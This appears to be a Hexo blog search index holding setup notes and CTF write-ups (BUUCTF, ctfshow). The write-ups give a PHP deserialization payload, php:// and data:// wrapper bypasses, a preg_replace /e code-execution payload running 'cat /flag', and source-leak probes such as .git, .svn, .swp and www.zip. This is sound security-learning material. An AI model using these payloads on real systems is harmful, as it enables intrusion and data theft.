<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hexo之文章加密</title>
      <link href="/2024/06/07/hexo%E4%B9%8B%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/06/07/hexo%E4%B9%8B%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>1.同样，进入根目录_config.yml配置文件，进行如下操作，没有就添加，有就修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt:</span><br><span class="line">enable: true</span><br></pre></td></tr></table></figure><p>2.找到你想要加密的文档，在文章信息头部添加信息，但是这里要注意，添加的时候冒号后面必须有一个空格才可以哦！！</p><p>举例如下：</p><p><img src="/2024/06/07/hexo%E4%B9%8B%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20135655.png" alt="屏幕截图 2024-06-07 135655"></p><p>3.然后重新hexo执行后，再次访问就需要密码才能查看文章啦，快去试试吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo篇章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jr渗透测试仪</title>
      <link href="/2024/06/07/Jr%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%AA-1/"/>
      <url>/2024/06/07/Jr%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%AA-1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="31a1a6156ce7c231a470862e1c1e9a492c50b69252b20a707ead62420f052199">808f957c8f3dcb8d024b1b97590380807c93bee142cb37608bee1e8e13d2b15b97c8aa38fb675c23136ad36fdbfc4d1fa509fc97ccebad996aa08d3724d8e7696eba2610ab964a4ce1ebe8c7c2774b4c960959d0a7af77b288598625eedfd200f826b6d2e6520e7f42f44b2af26ac0738c3c3a905023f7b2bfecd3a4c58b0184a02531781c38d53e6e1ac75108dbab914a75699f6160a2204b8b2b24fc9028d280a2fcd7a44bcccdd50a5e0e9d03ec981608b9a5765ce1caedf31d941db279da991ed11c361c1e09dc83eb54c4f2b08db779cf151af55a1f73fb1445a8691eb6f0216efbf11d6ad6173997dd19992bbd46f81a0a173d19c050bbebfff11f76bdebe69bfd5df28a80945a80512ce837c7a52d9de659c3aa8ca29490652a3ae97aa030b6505b57664216e6f9f7f0cd31996b21fabf0622a76cb4af2d1186aab4a00a03a8a8d7ff8fdee41e55809c9ed89b0a6242300628ca58fbb9ec4645cf0647607fb83f935ef568d0fee37ab8f18358d66a3f90ed76fba09fd074f7e8e9411260caae90cdc10822db9d731e2937936d64b05be4335cb6da6800fe6976ed351977606178609c3b7e712acf1b3adee074f7e3ed671862ae919d6ca8b6b23ac202bb9c5392a8b137f96b389e41c0e7a6637cade50e8dffd55670d4ecb6f5b0960aa02a41c4d4d08cc9065f75bdabb9579bac0c81efc92947644b7f94e1d794494a339be504cbea96211d1090a45ed8885a686bf93739fafce6f5d36bde0660a1d3e29a23d7443ffcc731c2e6dbdeb0c893628c997247ed8598d9941abfbf512126631820c54cf9b666d0b1c81eb24d54d48ce52a543cd3253ec4582dee3d2ec4943eb8a17cdb5b68c50ab80635caa5927b24febed4e11ac6824913162886d54b74bf6e771fd7133656697470754f61e52845fc51ef2ab99189f7bbcb494a2c304d458e4946b6046f7d1f91f23b6e865bb89172dddd2a474fc5a48d41dca0c80fada52f70a278a2c380841515f8def5a86d5bbb9e7e0f57bda7410cc3dbff653cd07c5a5f3390db71d14f7257d517e3a0559d65e3605f93d2ed5aa76f762b9c7b1dcbfdfb55fe906aa506578b42291c5033640692882b3fb3e6d12a633499bb7068645028f63ec17011b7825245759faf4c835c9d4d443e0f038cc29d0f49f7d899acb972a568129c3920a966bcac51ddfe43cd01d51df6b742405a705bb1695d406a7e2f1b034c09d9b95c0c973eeacef24d386d3f124994a0c2434c1a8ea385a65178c30b5591785737a206c8ded9ccb2b39f62aa86a6574cfaef346a7dc649680bed64f3dad0abeba9682ed4fcb9bb981275fa8b22fb320715ebd6c082d4fb9354b02b2560fa7ea45b48469aac0e3ddea70585986d07a0bf3910b89d64c41ab602d3e0c5c74365aab20bbf3464dacbbf1f6e441f2dd5271621e614d34ac4789bf605d7a51c87be745c296ca72e10f854528a1aa6a1cacb8abd14fe4329bcc7f16af41bb4bdf7b79dae8650366f3b50fee7482fdef1e1be93add4c3e4deca1c42e5a919973b231d841955ed3fa581b33d7c86a2b67ce7c941275c29ab0b322e5de845391e9134c9921e905e3dcac41ee74be54bbedbf70fab37496ed69697907f1a002798d56927aa4ad9f8b8a2e2dc8ffe4b903726c3bcfa133e4baaa84411cb7aa44e0702028543d84dd3634606c86685691fb2aa3f8433d3d047c16d2e549ed4ec4c5f2671b962a57cd4825d1ec898f3ec4428cf9380421a15ff340edf03bf1a7dd04c9d488e1cea1754bacd48529cda1f23ea26a2e5091a5beacbea38852b1551d9259bbd5f632efec1528a34a94a5b5d2e0a3d4bfd8cfeb7a8f05d133c3f6620ed3c0b49bb3359198cd268d808edf87ddb082d38d5cdef3fa7636992328957881f0c8e41397ed6e581a38794225138398ddcd76a523d16995c3d1002376051693e03a5f466aa8dcea2d63891623c9d3c7a7caafdae014b2706ee30b45163b67ac2c2ceead3fa93156b5c2b7d030edcf56c479c2f31e504c5d6702e687404c99508709f398a66e6f35ef36f2dfe959a58a03479c19bead26396d3ccbf8884b63d45e68e63cfbcb002074bca82cd8c933a54984d5e515207cfe6bb0efc9ce4cbcb00508d4daa68d66ecd407c657120753ccfcd38721aa3399e69a7c55129a27b31d76e26f130b29a974791f6d75a812420eb78e2f587660194f2cbcdd8047a6479f7ff4b35a991d5d674c2a239b64dc4425ef14212987aa4202d807edd872dfe02625cdb02aa8cfb32bbc0403f2031b968dd247b3d8cdaf529f470f4bd3b03102a694586a809dad80d27bdd87d875664e47d27a4a925b8a337b43d9c6dd68f5e2ac19f1af32df7d0dd03822cdad5af91936df33366749f88ce27292357b65c038a3a250eec9ab1a40ab4b71c655c385ba3d5a1aa3b104ad0e8b3c5df411c6398b045ff1fe3709a4989086598ff1d7ef364a13f7633219391469f4887091b025a8c0340221f4e641263ef613918f634085a24d8668b8ebbf3be7c4d2417e8da0279246c479a89b67c00397326f31627ee4affc87815573de04cbd00e735dcfd0defef1cd3c91fd3ceb1b2465f5012eec74e784cfaf32f55be8a3d597aa789fd7e21056064bd754a1804a38dd0d8dabd5076f162f299483b074c889b8e3b9e67dda0132ccde0afcb391e3dca5c61b115d5f5c3896b9e981062cdf2920d8eac19deeb8057daa4ea9792b8951601df59df74bef6db1d361af07c7220943e2d8f9f7d05fcd26641ebe4be3a7a11dc59eddf408c54ddaa19995666af17fc09206c3897a37dec0e3e57d4b9f7e5dcadf67e3b875899fbd2cb3125eeb29f46a91f9be572d142c8755a006252e0a47c1bf8185de6113f440c28d954f55bd321f4cdda1c9f49e2b37446bf5b682f1a9255726488d3ba3e948cf7a03609dd8a7655c278793d885aa19091adca31b4c3f0be6e55951dbe9b806fad7ce8fd7223a2e98fdbfdf8206e8646be139bbf3dc6a4bacdbe784f5d8a90bc8506c9d8b158fc13775fba6ba9307b3401f6722edde5e5c7a7b062774e4722e2ac0417c5972dab89de600943c57aa5544bc372ef4ac8fc4ebfea0dd6a6de2bb6d7bc11f989a72271ed662aaef96b05ad2bfe0db6d568cbfb179961c09328c93126d0425802b7c3fcc1213ef57e8a816649ab81070cc92a8eec789ab9a8450ab47bfc3777cebd20dc42ae8bf9388fb30b5fce8dd4ad9c7b8e35665ed1641ae5b218ff92655b8c35a9f28d1c787a8c63f71e85012b2048fe512b9b8a3fc292e24830db8d2b99a3d5c4c658f19e55656c71d90206409d92361488fef275b5ebe7e758419ed1ae8dbb6a1f00e8354ad4a4db3425d506bfd7df0a8f9fad10429f534536c93e729adace3d636dae38d9e31282f955d5aa2dda447f85fd6fb08da7fc742f46e34344161781f7d97c0184f16681509ac1b55c4709c31774bab87c7ed6017d900e9e6e3d1fc1b7468d22402b66ccfec94aba0e9baa07c3f75ac0ad5d83a08911051939bb6ae705c6d0083947da6de52132902a28fb6e3d4f25f58a066289b8b002726f997c1aee9e10da6532e504ac17c6791ee6e5dbd4bb9bd0bd211a61d1cc04d0314fbf131957c21f94a772d0e706734f28dfa46eac8115c3cd37860943b3a1631b554b076e6d4994a26168e1bb72aa9e09a99d8cfa99cdeeb0d50cda53007ee0520c5fdbcd610eadc6460c42f2385c44cb1cc20763648e677e2a83b7989b8876dda1458b3a33c0c98c45dfd2da7525a23ea481f1f1e668b4b64750da8ed44e92e5f61b5929566fe939776888490c9a5224e2d80f68ea0d3c3abb862c05693f2f7dab9b7dcad63fd9ce47b97ae80916d3b1fae91d94f48dfdce402a14434e6e981165ddee75cf02082440149511691d08845448ed7ad4c1b07333808a61fd864e9d8056051b2948d13a7a02fdfce20db2487fad6a913c9ba1f88969eb91d0072fc0b2d77cb926c174369a78f7462fa64edba72012c0b108bbe177baa867523182ca4689d25bcec3d8ac1206f726bbea14464091312aa2a59cc51f662f91afe0b8cc924c18ef78f2af0ea7442f7dc545c0bd3ee88283618f85ff2c861945100ad58e12ab8aa75b0dc5a9ca87401a757da06b71d143be1e420206f65a869be786c47e9e00f59b2c29d7663120b59a8fb388fa859053f37eb0dc5a7edff5eddfd5ec6a0fbe4b9d5659d4eb8b37f3267ca8d284e3194c0685efaa8603d425eefa59b80f5cb4c8c2a29b71bba566bbf7680af3da55cd63f4a791a27615642c25b3b33b2ed43401bb68b28f0ca0208f19e4fa18ffad33246ec75350e7da189c140da2a921240641bbc83a33f67d35e3339e227a5a6ba6b3b3309ead1d52ade7aec1311c30973a0ffef8ba8cb9daeb60051f1eb2e09c1896d410a7db227de54a5826fa499334967e2394ca73b5ae015956875a95a2ed191859fa06e7e083521ff5f090e85347bece9669ac64ae26bbb7000e74a21316394297f1181c2f737e7544ef74729034adbf4de8b243b8559b32de0b6d521535406da609002c6c3af4a60a183e864b649622f9b1c526604f8a2177f6f1effca562faa435f9d64a71952e5b16c99e411851214bbf62905ca92b28ba95fb7ed942cbdc57b016282dd61b72cfc1399c318e06b046bd697a3601d5f8693bd76e0391b997d1f6ceac68a3cd3d62353e866649d95547f6cc677100c5e47dfa5505d62bd10bf25599e9b14b5ccc5bc1b8f0fd2758d334d5252f3114df1ed991f0fd8f4eb8c66486a5d949a2c581cc32f6481d11aac40e5c0871d973c533043a1a1e049dbb957c6888eb1442fda32ef333fc6a49e5041463e820ca8c2659577696cd8b61c3ad4ca12b3e2b14cdaa6e941cbb834e47e00df6c1b3bb9a1ae763076aae8167412fc1e0e8588ba4c154cd8a73c536da688d5e49d89d1fedab86390709414c8ad81bab10840ebe75108dd422a8148b28407f6c5715fe2da72d3b5b5dc744c6ed58c29cb1cb6be71c1a0c102bbef8529baca10e07da64d03ef36f62c75f00e4017991433d9230f75d0c33c9f270d1bf9c37c49b8f8b23bc7c43454fb047b99f462550b8d9131ff32566fa1e79b125e2a9dcdf81e279c62e7a2e2e3cd81019f128637cb8fb66fe977be9364f68fecab4e01f03bf5e56</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo之插入图片</title>
      <link href="/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
      <url>/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="hexo之插入图片"><a href="#hexo之插入图片" class="headerlink" title="hexo之插入图片"></a>hexo之插入图片</h2><p>​参考了网上许多文章，都解决不了问题，然后经过我照猫画虎的多次尝试(也就几个小时吧😅)，找到了一个还能凑合的方法(但是感觉很麻烦😅，以后会造成个问题，且就这样吧先，没办法，不然得被这个问题困一天，先用着吧)。具体如下：</p><p>1.根目录下的_config.yml配置文件里面的post_asset_folder设置为true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即post_asset_folder: true</span><br></pre></td></tr></table></figure><p>2.上述完成后，利用hexo新建文档，如hexo new test，此时，它会自动在与test.md同目录下新建一个名字相同的文件即test文件，然后把你要显示的图片放在这个文件夹中。</p><p>3.打开Typora</p><p> 找到导航栏的文件–&gt;偏好设置–&gt;选择图像，然后像下面一样配置，它会在同目录下新建一个名为assets的文件夹，这样以后所有用到的图片都会被再次保存在这里面</p><img src="/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/a.png" alt="a" style="zoom: 33%;"><p>4.插入图片</p><p>如下，到插入本地图片这一步之后，一定要注意！！！一定是在第二步中的文件夹里面选择插入的图片，不然上传之后显示不出来(血的教训啊)。</p><img src="/2024/06/07/hexo%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-07%20133143.png" alt="屏幕截图 2024-06-07 133143" style="zoom:50%;"><p>5.然后编辑，保存即可。</p><p>然后就可以上传查看是否显示成功啦。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s   静态查看</span><br><span class="line">hexo d </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo篇章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于主题</title>
      <link href="/2024/06/01/%E5%85%B3%E4%BA%8E%E4%B8%BB%E9%A2%98/"/>
      <url>/2024/06/01/%E5%85%B3%E4%BA%8E%E4%B8%BB%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>​好了，我放弃了，为什么这个shokaX主题怎么这么难配置捏，已经重装了好多次了，卒。<br>——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————<br>   更新，魔改了一下主题，和我之前想象的有了一些出入，不过自己diy是一件挺奇妙的事情，还有就是它这个玩法是真多啊😅。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo篇章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题</title>
      <link href="/2024/06/01/buu%E5%88%B7%E9%A2%98/"/>
      <url>/2024/06/01/buu%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h2><p>​    这道题直接用md5数组绕过以及反序列化，反序列化这里直接把$correct的值赋给$unput即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class BUU &#123;</span><br><span class="line">   public $correct = &quot;&quot;;</span><br><span class="line">   public $input = &quot;&quot;;</span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct === $this-&gt;input) &#123;</span><br><span class="line">               echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception $e) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new BUU();</span><br><span class="line">$a-&gt;input=&amp;$a-&gt;correct;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>​这道题分两步：<br>第一步：绕过file_get_contents()     伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.绕过file_get_contents()两种方法</span><br><span class="line">(1)$text=data://text/plain,I have a dream   或者text=data://text//plain;base64,SSBoYXZlIGEgZHJlYW0=</span><br><span class="line">(2)$text=php://inut</span><br><span class="line">然后post发送I have a dream</span><br><span class="line">2.伪协议</span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=next.php</span><br><span class="line">base64解码得到源码</span><br></pre></td></tr></table></figure><p>第二步 preg_replace   命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">return preg_replace(</span><br><span class="line">&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,</span><br><span class="line">&#x27;strtolower(&quot;\\1&quot;)&#x27;,</span><br><span class="line">$str</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p>知识：preg_replace(要搜索的字符串，要替换的字符串，原始字符串)第一个参数以&#x2F;e结尾时，会存在命令执行漏洞，即如果有&#x2F;e，且匹配到了符合正则的字符串,第二个参数将被执行，而这里的strtolower(“\1”)即strtolower(“\1”),\1有自己的意思，即取出正则表达式匹配后子匹配表达式的第一项，就是取出匹配到的{${phpinfo()}},再转化为字符串，即”{${phpinfo()}}”,然后执行。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vip限免</title>
      <link href="/2024/05/31/vip%E9%99%90%E5%85%8D/"/>
      <url>/2024/05/31/vip%E9%99%90%E5%85%8D/</url>
      
        <content type="html"><![CDATA[<p>1.源码泄露</p><p>查看源码即可</p><p>2.前台JS绕过</p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js前台拦截 === 无效操作</span><br></pre></td></tr></table></figure><p>我的回答：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3种方法：</span><br><span class="line">1.浏览器禁用js后刷新即可     </span><br><span class="line">地址栏输入：about:config</span><br><span class="line">    找到 javascript.enabled 将其转换为false</span><br><span class="line">2.Ctrl+U查看源代码</span><br><span class="line">3.开发者工具</span><br></pre></td></tr></table></figure><p>3.协议头信息泄露</p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没思路的时候抓个包看看，可能会有意外收获</span><br></pre></td></tr></table></figure><p>我的回答:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抓包，或者在firefox在网络那一栏的消息头里面可以看到</span><br></pre></td></tr></table></figure><p>4.robots后台泄露            </p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure><p>我的回答：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url后加上robots.txt后，得到信息，在重新访问/flagishere.txt</span><br></pre></td></tr></table></figure><p>漏洞原理及危害： 网站根目录下存在robots.txt文件，其内容规定了网络爬虫可爬和不可爬的目录文件。 搜索引擎可以通过robots文件可以获知哪些页面可以爬取，哪些页面不可以爬取。robots.txt文件可能会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。</p><p>5.phps源码泄露            </p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phps源码泄露有时候能帮上忙</span><br></pre></td></tr></table></figure><p>访问index.phps，打开即可</p><p>6.源码压缩包泄露</p><p>url+<a href="http://www.zip,之后再访问url+fl000g.txt,得到flag/">www.zip，之后再访问url+fl000g.txt,得到flag</a></p><p>7.版本控制泄露源码            </p><p>.git泄露，url+.git</p><p>8.版本控制泄露源码2            </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目:版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure><p>.svn泄露，url+.svn</p><p>9.vim临时文件泄露            </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述:    </span><br><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure><p>访问&#x2F;index.php.swp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原理:</span><br><span class="line">vim临时文件泄露 vim是linux自带且常用的文件编辑器，vim在编辑时会生成一个隐藏的临时文件，当vim非正常关闭时这个文件就会被保留下来。 使用vim时意外退出，会在目录下生成一个备份文件，格式为 .文件名.swp，访问/index.php.swp下载备份文件，用记事本打开即可 。</span><br></pre></td></tr></table></figure><ol start="10"><li><pre><code>         cookie泄露</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述:</span><br><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure><p>直接查看cookie</p><p>11.域名txt记录泄露            </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line">域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</span><br><span class="line">5月30日 修复，目标地址为**flag.ctfshow.com**</span><br></pre></td></tr></table></figure><p>使用在线网站：<a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p><p>现在好像解不出来了，参考了下其他人的wp,答案是flag{just-seesee}</p><ol start="12"><li></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-misc冲关1</title>
      <link href="/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/"/>
      <url>/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/</url>
      
        <content type="html"><![CDATA[<p>1.杂项签到</p><p>使用zip工具发现没有加密，那就是zip伪加密，修改第二个源文件PK的504B0102 xxxx 0900 0800，重新打开即可</p><p>zip伪加密知识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">原理：zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。</span><br><span class="line"></span><br><span class="line">背景：**一个 ZIP 文件由三个部分组成：**</span><br><span class="line"></span><br><span class="line">压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志 </span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">压缩源文件数据区： </span><br><span class="line"> 50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class="line"> 14 00：解压文件所需 pkware 版本 </span><br><span class="line"> 00 00：全局方式位标记（有无加密） </span><br><span class="line"> 08 00：压缩方式 </span><br><span class="line"> 5A 7E：最后修改文件时间 </span><br><span class="line"> F7 46：最后修改文件日期 </span><br><span class="line"> 16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line"> 19 00 00 00：压缩后尺寸（25） </span><br><span class="line"> 17 00 00 00：未压缩尺寸（23） </span><br><span class="line"> 07 00：文件名长度 </span><br><span class="line"> 00 00：扩展记录长度 </span><br><span class="line"> 6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 </span><br><span class="line"> 压缩源文件目录区： </span><br><span class="line"> 50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class="line"> 3F 00：压缩使用的 pkware 版本 </span><br><span class="line"> 14 00：解压文件所需 pkware 版本 </span><br><span class="line"> 00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） </span><br><span class="line"> 08 00：压缩方式 </span><br><span class="line"> 5A 7E：最后修改文件时间 </span><br><span class="line"> F7 46：最后修改文件日期 </span><br><span class="line"> 16 B5 80 14：CRC-32校验（1480B516） </span><br><span class="line"> 19 00 00 00：压缩后尺寸（25） </span><br><span class="line"> 17 00 00 00：未压缩尺寸（23） </span><br><span class="line"> 07 00：文件名长度 </span><br><span class="line"> 24 00：扩展字段长度 </span><br><span class="line"> 00 00：文件注释长度 </span><br><span class="line"> 00 00：磁盘开始号 </span><br><span class="line"> 00 00：内部文件属性 </span><br><span class="line"> 20 00 00 00：外部文件属性 </span><br><span class="line"> 00 00 00 00：局部头部偏移量 </span><br><span class="line"> 6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 </span><br><span class="line"> 压缩源文件目录结束标志： </span><br><span class="line"> 50 4B 05 06：目录结束标记 </span><br><span class="line"> 00 00：当前磁盘编号 </span><br><span class="line"> 00 00：目录区开始磁盘编号 </span><br><span class="line"> 01 00：本磁盘上纪录总数 </span><br><span class="line"> 01 00：目录区中纪录总数 </span><br><span class="line"> 59 00 00 00：目录区尺寸大小 </span><br><span class="line"> 3E 00 00 00：目录区对第一张磁盘的偏移量 </span><br><span class="line"> 00 00：ZIP 文件注释长度</span><br><span class="line"></span><br><span class="line">测试：若把文本区原来显示PK的50 4B改成其他数据，也不可读</span><br></pre></td></tr></table></figure><p>2.misc2</p><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">偶然发现我竟然还有个软盘，勾起了我的回忆。</span><br></pre></td></tr></table></figure><p><img src="/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240531145011031.png" alt="image-20240531145011031"></p><p>我的解答:</p><p>随便选择一个虚拟机，编辑虚拟机设置，选择添加，选择软盘驱动器，选择使用软盘映像文件，然后重新打开虚拟机即可。</p><p><img src="/2024/05/31/ctfshow-misc%E5%86%B2%E5%85%B31/Users\史小乐\AppData\Roaming\Typora\typora-user-images\image-20240531145752783.png" 